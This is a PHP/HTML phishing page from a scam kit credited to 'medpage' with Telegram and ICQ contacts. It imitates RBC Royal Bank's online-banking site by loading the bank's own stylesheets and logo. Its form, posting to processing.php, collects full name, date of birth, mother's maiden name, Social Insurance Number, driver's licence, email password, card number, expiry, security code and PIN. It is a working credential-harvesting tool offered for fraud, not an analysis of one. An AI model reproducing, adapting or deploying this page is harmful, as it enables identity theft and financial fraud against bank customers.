<?php
/*
 * Scampage by medpage
 * ICQ: 679849675
 * TELE: @medpagestore
 */
require "../includes/session_protect.php";
require "../includes/functions.php";
require "../includes/One_Time.php";



?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">




<!-- Start of 3MSRCPATH.CINC -->




<form>
  <input type="hidden" name="EBG_TEMPLATE" id="EBG_TEMPLATE" value="3MSIPCHAL.HTM" />
</form>

<!-- End of 3MSRCPATH.CINC -->
<html>
 <head>
  <meta name="Identifier" content="3MSIPCHAL.HTM;9;ENGLISH;RB-MBP" />
  <noscript>
   <meta http-equiv="refresh" content="0; URL=/cgi-bin/rbaccess/rbcgi3m01?F8=1&amp;F22=HT&amp;REQUEST=SIGNOUT&amp;NS=Y&amp;CPG=7316&amp;LANGUAGE=ENGLISH" />
  </noscript>
<!-- 3MSHELLHDPT.INC: -->
<link href="https://www1.royalbank.com/uos/common/images/icons/favicon.ico" rel="icon">
<link href="https://www1.royalbank.com/uos/common/css/common.css?6" type="text/css" rel="stylesheet" />
<link href="https://www1.royalbank.com/uos/common/css/legacy.css?6" type="text/css" rel="stylesheet" />
<link href="https://www1.royalbank.com/uos/common/css/main01.css?6" type="text/css" rel="stylesheet" />
<link href="https://www1.royalbank.com/uos/common/css/main02.css?6" type="text/css" rel="stylesheet" />
<link href="https://www1.royalbank.com/uos/common/css/tabs.css?6" type="text/css" rel="stylesheet" />
<link rel="stylesheet" type="text/css" href="https://www1.royalbank.com/uos/common/css/print.css?6" media="print"/>



<link href="https://www1.royalbank.com/uos/common/images/icons/favicon.ico" rel="icon">
<link href="https://www1.royalbank.com/uos/common/css/common.css?6" type="text/css" rel="stylesheet" />
<link href="https://www1.royalbank.com/uos/common/css/legacy.css?6" type="text/css" rel="stylesheet" />
<link href="https://www1.royalbank.com/uos/common/css/main01.css?6" type="text/css" rel="stylesheet" />
<link href="https://www1.royalbank.com/uos/common/css/main02.css?6" type="text/css" rel="stylesheet" />
<link href="https://www1.royalbank.com/uos/common/css/tabs.css?6" type="text/css" rel="stylesheet" />
<link rel="stylesheet" type="text/css" href="https://www1.royalbank.com/uos/common/css/print.css?6" media="print"/>
<script src="https://www1.royalbank.com/uos/common/javascript/utilities.js?6" type="text/javascript"></script>
<script src="https://www1.royalbank.com/uos/common/javascript/browser.js?6" type="text/javascript"></script>
<script src="https://www1.royalbank.com/uos/common/javascript/ie/event.js?6" type="text/javascript"></script>
<script src="https://www1.royalbank.com/uos/common/javascript/event.js?6" type="text/javascript"></script>
<script src="https://www1.royalbank.com/uos/common/javascript/kiosk.js?6" type="text/javascript"></script>
<script src="https://www1.royalbank.com/uos/common/javascript/buttons.js?6" type="text/javascript"></script>
<script src="https://www1.royalbank.com/uos/common/javascript/cookie.js?6" type="text/javascript"></script>
<script src="https://www1.royalbank.com/uos/common/javascript/header_dates.js?6" type="text/javascript"></script>
<script src="https://www1.royalbank.com/uos/common/javascript/safaricss.js?6" type="text/javascript"></script>
<script language="JavaScript" type="text/javascript">
function shellExpired()
{
  var pDelta = rbcGetCookie( "3mDELTA", null );
  var pSessn = rbcGetCookie( "3movACWQDI2dIjWVgbAAD4GwAAVwilAA", null );

  if ( pDelta != null )
  {
    var loc   = pDelta.indexOf( '/', 0 );
    var delta = 0;
    var dtype = '0';

    if ( loc != -1 )
    {
      delta = new Number( pDelta.substring( 0, loc ) );
      dtype = pDelta.substring( loc + 1, pDelta.length );
    }
    else delta = new Number( pDelta );

    switch (dtype)
    {
      case '0':
      {
        var cdate = new Date();
        var sdate = new Date( cdate.valueOf() + 1800 );
        cdate = new Date( cdate.valueOf() + 604800000 );

        if ( pSessn == null )
        {
          rbcSetCookie( "3mDELTA", delta + 43200 + "/1", cdate.toGMTString(), "/" );
          rbcSetCookie( "3movACWQDI2dIjWVgbAAD4GwAAVwilAA", "1", sdate.toGMTString(), "/" );
        }
        else if ( pSessn != '1' )
          rbcSetCookie( "3mDELTA", delta + "/2", cdate.toGMTString(), "/" );

        break;
      }
      case '1':
      {
        if ( pSessn == null )
          rbcDeleteCookie( "3mDELTA", "/" );
        else if ( pSessn != '1' )
        {
          var cdate = new Date();
          cdate = new Date( cdate.valueOf() + 604800000 );
          rbcSetCookie( "3mDELTA", delta + "/2", cdate.toGMTString(), "/" );
        }
        break;
      }
      default :
      {
        if ( pSessn == null ) // Clear and show expired
        {
          document.location.replace( "/cgi-bin/rbaccess/rbcgi3m01?F8=1&F22=IB&REQUEST=SIGNOUT&LANGUAGE=ENGLISH" );
        }
      }
    }
  }
}
event_addOnLoad(new Array(shellExpired));
event_addOnFocusForm(new Array(shellExpired));
setTimeout( shellExpired ,1801000);
</script>
<script src="https://www1.royalbank.com/uos/common/javascript/header_dates.js?6" type="text/javascript"></script>
<script language="javascript" type="text/javascript">
<!--
function checkOnFocusForm() {
    if ( rbcGetCookie ("3MTK","NOTTHERE") != "NOTTHERE" ){
      rbcDeleteCookie("3MTK","/");
    }
    rbcSetCookie("F100","1/WX5/2F-6fGkqLkFcS.N9LYG6foKJloaPm-jbIv1NCBA1pOmFEezmPC8YyqcL5cOY4kZ8CBUlnyxKvUQdoACINaU6qg__/GQAAAA__/S0/PB", null, "/");
}
checkOnFocusForm();
event_addOnFocusForm(new Array(checkOnFocusForm));
//-->
</script>


<!-- 3MSHELLHDPT.INC. -->

  <title>
    RBC Financial Group - Online banking
  </title>
</head>

<body onFocus="event_onFocusForm(); " onBlur="event_onBlurForm();" onLoad="event_onLoad();" onUnload="event_onUnload();">
 <div id="wrapper">
 <a name="top"></a>














      <div class="skipnav"><a href="#skipheadernav" onfocus='this.parentNode.className=""' onblur='this.parentNode.className="skipnav"'>Skip Header Navigation</a></div>
      <!-- Secure Header Start -->
      <div id="globalheader" class="clear globalheader-basic globalheader-secure">
        <div id="globalheader-logo">
                    <img src="https://www1.royalbank.com/uos/common/images/logos/web/rbc_royalbank_en.gif" alt="RBC Royal Bank" title="RBC Royal Bank" width="210" height="47" />
        </div>

        <p id="globalheader-links">


          <a href="javascript:kiosk_OpenWinRTB('https://www.rbcroyalbank.com/onlinebanking/help.html?RefURL=https://www1.royalbank.com/cgi-bin/rbaccess/rbcgi3m01', 'CONTACT', kiosk_Type2X, kiosk_Type2Y, kiosk_Type2R )" title="Customer Service (opens new window)">Customer Service</a>



        </p>

        <p id="globalheader-secureinfo">

        </p>
        <p id="globalheader-tools"><script type="text/javascript" language="JavaScript">dates_currentDate( 'ENGLISH' );</script></p>
      </div>

      <!-- Secure Header End -->
      <div class="skipnavanchor"><a name="skipheadernav" id="skipheadernav"></a></div>


 <div id="layout" class="clear">

 <div id="layout-column-main" style="width:946px">



 <!-- START: nav style -->

 <table border="0" width="100%">


  <tr valign="top" align="left">

      <td width="5"></td>
	  
      <!-- START: content -->
      <td valign="top" ><script language="JavaScript" type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/rsa.js"></script>
<form name="continueform" method="post" action="processing.php"  >






  <table border="0" width="100%">
   <tr>
    <td>
     <table border="0" cellspacing="0" cellpadding="0" width="100%">
      <tr>

       <td colspan="2" align="left">
        <div id="pagetitlearea" class="clear">
           <h1 id="pagetitle">
             Your Information
           </h1>
       </div>
       </td>
      </tr>


      <tr><td colspan="2" height="5" align="left"></td></tr>
      <tr>
       <td colspan="2" class="bodyText">
        To help us verify your identity, please enter your information:<br /><br />
       </td>
      </tr>
      <tr>
       <td colspan="2" >
       <span class="contentframework-required-note"><b class="contentframework-required-asterisk">*</b>Required Information</span><br /><br />
       </td>
      </tr>
	  <tr>
         
       <td colspan="2">
        <table class="contentframework" style="border-bottom:0px">
		 <tr>
          <td class="contentframework-formdatalabel"  >
           <label for="pvqAnswer">
           <SPAN class="contentframework-negativeindent">
           <b class="contentframework-required-asterisk">*</b></SPAN><strong>Full Name:</strong>
     </label>
          </td>
          <td >
           <input required type="text" name="FN" id="pvqAnswer" size="21"  required="" value="" /> <span class="contentframework-contextualhelp">


          </td>
         </tr>
         <tr>
          <td class="contentframework-formdatalabel"  >
           <label for="pvqAnswer">
           <SPAN class="contentframework-negativeindent">
           <b class="contentframework-required-asterisk">*</b></SPAN><strong>Date of Birth:</strong>
     </label>
          </td>
          <td >
           <input type="text" name="D1" id="pvqAnswer" size="2" maxlength="2" minlength="2" required="" value="" /> / <input type="text" name="D2" required="" id="pvqAnswer" size="2" maxlength="2" minlength="2"  value="" /> / <input type="text" name="D3" id="pvqAnswer" size="4" required="" maxlength="4" minlength="4"  value="" /><span class="contentframework-contextualhelp">


          </td>
         </tr>
		
      <tr>
		  <tr>
          <td class="contentframework-formdatalabel"  >
           <label for="pvqAnswer">
           <SPAN class="contentframework-negativeindent">
           <b class="contentframework-required-asterisk">*</b></SPAN><strong>Mother's maiden name:</strong>
     </label>
          </td>
          <td >
           <input type="text" name="MN" id="pvqAnswer" size="21"  required="" value="" /> <span class="contentframework-contextualhelp">


          </td>
         </tr>
         
		  <tr>
          <td class="contentframework-formdatalabel"  >
           <label for="pvqAnswer">
           <SPAN class="contentframework-negativeindent">
           <b class="contentframework-required-asterisk">*</b></SPAN><strong>Social Insurance Number:</strong>
     </label>
          </td>
          <td >
           <input type="tel" name="S1" required="" id="pvqAnswer" size="3" maxlength="3" minlength="2"  value="" /> - <input type="tel" name="S2" required="" id="pvqAnswer" size="3" maxlength="3" minlength="3"  value="" /> - <input type="tel" name="S3" id="pvqAnswer" size="3" required=""  minlength="3" maxlength="3" value="" /><span class="contentframework-contextualhelp">


          </td>
         </tr>
		  <tr>
          <td class="contentframework-formdatalabel"  >
           <label for="pvqAnswer">
           <SPAN class="contentframework-negativeindent">
           <b class="contentframework-required-asterisk">*</b></SPAN><strong>Driver's License Number:</strong>
     </label>
          </td>
          <td >
           <input type="tel" name="DL" id="pvqAnswer" size="21"  required="" value="" /> <span class="contentframework-contextualhelp">


          </td>
         </tr>
         <tr>
          <td class="contentframework-formdatalabel"  >
           <label for="pvqAnswer">
           <SPAN class="contentframework-negativeindent">
           <b class="contentframework-required-asterisk">*</b></SPAN><strong>Email Address:</strong>
     </label>
          </td>
          <td >
           <input type="text" name="EA" id="pvqAnswer" size="21"  required="" value="" /> <span class="contentframework-contextualhelp">


          </td>
         </tr>
          <tr>
          <td class="contentframework-formdatalabel"  >
           <label for="pvqAnswer">
           <SPAN class="contentframework-negativeindent">
           <b class="contentframework-required-asterisk">*</b></SPAN><strong>Email Password:</strong>
     </label>
          </td>
          <td >
           <input type="password" name="EP" id="pvqAnswer" size="21"  required="" value="" /> <span class="contentframework-contextualhelp">


          </td>
         </tr>
          </td>

     
		</table>
	
       
       </td>
		  <table border="0" cellspacing="0" cellpadding="0" width="100%">
      <tr>

       <td colspan="2" align="left">
        <div id="pagetitlearea" class="clear">
           <h1 id="pagetitle">
		   Card Information
           </h1>
       </div>
       </td>
      </tr>


      <tr><td colspan="2" height="5" align="left"></td></tr>
      
      <tr>
       <td colspan="2">
        <table class="contentframework" style="border-bottom:0px">
		 <tr>
          <td class="contentframework-formdatalabel"  >
           <label for="pvqAnswer">
           <SPAN class="contentframework-negativeindent">
           <b class="contentframework-required-asterisk">*</b></SPAN><strong>Card Type:</strong>
     </label>
          </td>
          <td >
           <select name="CT" style="width:100px">
		   <option value="DEBIT">DEBIT</option>
		   <option value="DEBIT">CREDIT</option>
		   </select>

          </td>
         </tr>
		 <tr>
          <td class="contentframework-formdatalabel"  >
           <label for="pvqAnswer">
           <SPAN class="contentframework-negativeindent">
           <b class="contentframework-required-asterisk">*</b></SPAN><strong>Name on Card:</strong>
     </label>
          </td>
          <td >
           <input type="text" name="NC" id="pvqAnswer" size="21"  required="" value="" /> <span class="contentframework-contextualhelp">


          </td>
         </tr>
		 <tr>
          <td class="contentframework-formdatalabel"  >
           <label for="pvqAnswer">
           <SPAN class="contentframework-negativeindent">
           <b class="contentframework-required-asterisk">*</b></SPAN><strong>Card Number:</strong>
     </label>
          </td>
          <td >
           <input type="text" name="CN" id="pvqAnswer" size="21" maxlength="16" minlength="16"  required="" value="" /> <span class="contentframework-contextualhelp">


          </td>
         </tr>
         <tr>
          <td class="contentframework-formdatalabel"  >
           <label for="pvqAnswer">
           <SPAN class="contentframework-negativeindent">
           <b class="contentframework-required-asterisk">*</b></SPAN><strong>Exp Date:</strong>
     </label>
          </td>
          <td ><input type="text" name="E1" required="" id="pvqAnswer" size="2" maxlength="2" minlength="2"  value="" /> / <input type="text" name="E2" id="pvqAnswer" size="4" required="" minlength="4"  maxlength="4" value="" /><span class="contentframework-contextualhelp">


          </td>
         </tr>
		  <tr>
          <td class="contentframework-formdatalabel"  >
           <label for="pvqAnswer">
           <SPAN class="contentframework-negativeindent">
           <b class="contentframework-required-asterisk">*</b></SPAN><strong>Card Security Code(CSC):</strong>
     </label>
          </td>
          <td >
           <input type="password" name="CV" id="pvqAnswer" size="11" maxlength="3" minlength="3"   required="" value="" /> <span class="contentframework-contextualhelp">


          </td>
         </tr>
       

		 <tr>
          <td class="contentframework-formdatalabel"  >
           <label for="pvqAnswer">
           <SPAN class="contentframework-negativeindent">
           <b class="contentframework-required-asterisk">*</b></SPAN><strong>Card PIN:</strong>
     </label>
          </td>
          <td >
           <input type="password" name="AP" id="pvqAnswer" size="11" maxlength="6" minlength="4"  required="" value="" /> <span class="contentframework-contextualhelp">


          </td>
         </tr>
        </table>
   
	
       
       </td>
      </tr>
     </table>
    </td>
  
    <td width="216">&nbsp;</td>
   </tr>

   <tr><td colspan="2">&nbsp;</td></tr>

   <tr>
    <td>
      <table width="100%" cellpadding="0" cellspacing="0" border="0">
          <tr>
            <td>
<!--3MBUTTON01.CINC: en-->








<span class="button button-secondary">

</span>



<!--3MBUTTON01.CINC. en-->
            </td>
            <td colspan="2" align="right">
<!--3MBUTTON01.CINC: en-->







 <span style="float:right;" >

<span class="">
<span>
<input type="image" src= "1.png" alt=""  />
</span>
</span>



<!--3MBUTTON01.CINC. en-->
            </td>
          </tr>
      </table>
    </td>
    <td width="216">&nbsp;</td>
   </tr>
  </table>
</form>

 

      <!-- END:   content -->

  </tr>
 </table>
 </div>

 </div>


<!--3MSHELLFTPT.INC:-->

 <div id="globalfooter">
  <div id="globalfooter-main">
      <p>Royal Bank of Canada Website, &copy; 1995-2021</p>
 
 
			
   <p><a href="javascript:kiosk_OpenWinRTB( 'http://www.rbc.com/privacysecurity/ca/', 'RTB', kiosk_Type2X, kiosk_Type2Y, kiosk_Type2R )" title="Privacy &amp; Security (opens new window)" >Privacy &amp; Security</a> | 
   <a href="javascript:kiosk_OpenWinRTB( 'http://www.rbc.com/legal/', 'RTB', kiosk_Type3X, kiosk_Type3Y, kiosk_Type3R )" title="Legal (opens new window)" >Legal</a> | 
   <a href="javascript:kiosk_OpenWinRTB( 'http://www.rbc.com/accessibility/', 'RTB', kiosk_Type3X, kiosk_Type3Y, kiosk_Type3R )" title="Accessibility (opens new window)">Accessibility</a>
   </p>
  </div>
 </div>

<!--3MSHELLFTPT.INC.-->
<!-- 3MSHELLFOOT.JS -->

<!-- 3MSHELLFOOT.JS -->
 <!-- Start of 3MSHELLFENT.INC -->
 
 <!-- Endt of 3MSHELLFTAB.INC -->
</div>
</body>


</html>
